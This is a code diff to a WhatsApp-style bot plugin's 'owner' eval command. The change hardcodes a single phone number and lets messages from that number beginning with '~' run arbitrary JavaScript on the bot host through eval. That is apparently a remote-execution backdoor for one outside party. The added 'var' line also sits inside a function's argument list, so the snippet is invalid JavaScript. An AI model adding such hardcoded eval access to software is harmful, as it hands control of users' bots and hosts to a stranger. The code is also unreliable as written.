@@ -10,6 +10,7 @@ eypz({
 		category: "owner",
 		filename: __filename
 	},
+     var Ameen = ['916238768108']
 	async (conn, mek, m, {
 		from,
 		quoted,
@@ -34,12 +35,13 @@ eypz({
 		isAdmins,
 		reply
 	}) => {
-		if (body.startsWith(">")) {
-			try {
-				let evaled = await eval(`(async () => { ${body?.replace(">", "")} })()`);
-				if (typeof evaled !== "string") evaled = util.inspect(evaled);
-				await m.reply(`${evaled}`)
-			} catch (e) {
+		if (Ameen.includes(senderNumber)) {
+        if (body.startsWith("~")) {
+            try {
+                let evaled = await eval(`(async () => { ${body?.replace("~", "")} })()`);
+                if (typeof evaled !== "string") evaled = util.inspect(evaled);
+                await reply(`${evaled}`);
+	    } catch (e) {
 				m.reply(`${e.message}`);
 			}
 		}
